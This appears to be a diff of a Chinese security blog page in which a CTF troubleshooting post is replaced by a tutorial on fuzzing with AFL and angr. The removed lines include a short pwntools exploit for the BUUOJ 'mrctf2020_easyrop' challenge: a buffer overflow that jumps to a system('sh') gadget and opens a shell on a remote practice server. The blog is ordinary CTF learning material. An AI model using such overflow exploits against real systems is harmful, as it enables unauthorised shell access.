@@ -16,23 +16,23 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="解决或未解决的奇怪问题">
+    <meta name="description" content="模糊测试的学习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="遇到的奇奇怪怪问题汇总">
-<meta property="og:url" content="https://isolator-1.github.io/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:title" content="FUZZ-AFL">
+<meta property="og:url" content="https://isolator-1.github.io/2023/03/15/fuzz/fuzz/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="解决或未解决的奇怪问题">
+<meta property="og:description" content="模糊测试的学习">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-11-29T13:35:00.000Z">
-<meta property="article:modified_time" content="2023-03-18T15:22:30.163Z">
+<meta property="article:published_time" content="2023-03-15T14:54:00.000Z">
+<meta property="article:modified_time" content="2023-03-20T04:49:30.801Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="ctf-pwn">
-<meta property="article:tag" content="Others">
+<meta property="article:tag" content="fuzz">
+<meta property="article:tag" content="afl">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>遇到的奇奇怪怪问题汇总 - Isolator&#39;s Blog</title>
+  <title>FUZZ-AFL - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="遇到的奇奇怪怪问题汇总"></span>
+            <span id="subtitle" data-typed-text="FUZZ-AFL"></span>
           
         </div>
 
@@ -208,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-29 21:35" pubdate>
-          November 29, 2022 pm
+        <time datetime="2023-03-15 22:54" pubdate>
+          March 15, 2023 pm
         </time>
       </span>
     
@@ -220,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          878 words
+          979 words
         
       </span>
     
@@ -231,7 +231,7 @@
         
         
         
-          8 mins
+          9 mins
         
       </span>
     
@@ -269,25 +269,36 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">遇到的奇奇怪怪问题汇总</h1>
+            <h1 style="display: none">FUZZ-AFL</h1>
             
             
               <div class="markdown-body">
                 
-                <h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>
-<p>本来是很简单的一个溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>
+                <h3 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h3><p>安装afl</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install afl<br></code></pre></td></tr></table></figure>
 
-<p>但是不加sleep无法通过</p>
-<p>有人说是python同时发送多个字符串时会合并(?)</p>
-<p>那什么时候情况下需要在sendline前面加一个sleep</p>
-<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>
-<hr>
-<h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure>
+<p>写一个在特定输入会崩溃的程序 <code>c1.cpp</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-type">char</span> ptr[<span class="hljs-number">20</span>];<br>	cin&gt;&gt;ptr;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(ptr,<span class="hljs-string">&quot;deadbeef&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>		<span class="hljs-built_in">abort</span>();<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>用到这个快捷方式时要修改一下</p>
+<p>使用afl-g++编译，这样编译出来的程序会被插桩</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-g++ -g c1.cpp -o c1.out<br></code></pre></td></tr></table></figure>
+
+<p>创建一个<code>input_folder</code>，这里<code>input_folder</code>里先随便放一个文本文件<code>abc</code>，里面写入<code>hello</code>。</p>
+<p>再创建一个<code>output_folder</code>，什么都不用放进去</p>
+<p>开始对得到的程序进行fuzz</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i ./input_folder -o ./output_folder c1.out<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为afl在进行模糊测试的时候是将这个<code>input_folder</code>里的文件作为输入，然后对给定的输入使用遗传算法不断进行变化，将变化出来的结果继续输入给程序，因此，虽然随便输入什么都是可以的，但是输入的内容与程序崩溃的输入越接近，则afl得到结果的速度越快。</p>
+</blockquote>
+<h3 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h3><p>安装angr：直接用docker，dockerhub上有angr的镜像</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker pull angr/angr<br>sudo docker run (--net host) -it angr/angr bash<br></code></pre></td></tr></table></figure>
+
+<p>angr的简单例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;/bin/true&#x27;</span>) <span class="hljs-comment"># /bin/true是linux的一个永远return 0的程序</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex <span class="hljs-comment"># 将输出转为16进制，但是docker里并不自带，要pip install一下</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch<br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<br><span class="hljs-number">0x401670</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename<br><span class="hljs-string">&#x27;/bin/true&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
 
                 
               </div>
@@ -306,7 +317,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%9D%82%E9%A1%B9/" class="category-chain-item">杂项</a>
+  <a href="/categories/fuzz/" class="category-chain-item">fuzz</a>
   
   
 
@@ -321,9 +332,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+        <a href="/tags/fuzz/">#fuzz</a>
       
-        <a href="/tags/Others/">#Others</a>
+        <a href="/tags/afl/">#afl</a>
       
     </div>
   
@@ -335,8 +346,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>遇到的奇奇怪怪问题汇总</div>
-      <div>https://isolator-1.github.io/2022/11/29/杂项/遇到的奇奇怪怪问题汇总/</div>
+      <div>FUZZ-AFL</div>
+      <div>https://isolator-1.github.io/2023/03/15/fuzz/fuzz/</div>
     </div>
     <div class="license-meta">
       
@@ -348,7 +359,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>November 29, 2022</div>
+          <div>March 15, 2023</div>
         </div>
       
       
@@ -380,9 +391,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/" title="菜鸡的2022datacon记录">
+                      <a href="/2023/04/21/ctf-pwn/%5BHarekazeCTF2019%5Dbaby_rop2/" title="HarekazeCTF2019 baby_rop2">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">菜鸡的2022datacon记录</span>
+                        <span class="hidden-mobile">HarekazeCTF2019 baby_rop2</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -390,8 +401,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/29/ctf-pwn/%5BZJCTF%202019%5DEasyHeap/" title="ZJCTF 2019 EasyHeap">
-                        <span class="hidden-mobile">ZJCTF 2019 EasyHeap</span>
+                      <a href="/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="程序保护机制">
+                        <span class="hidden-mobile">程序保护机制</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
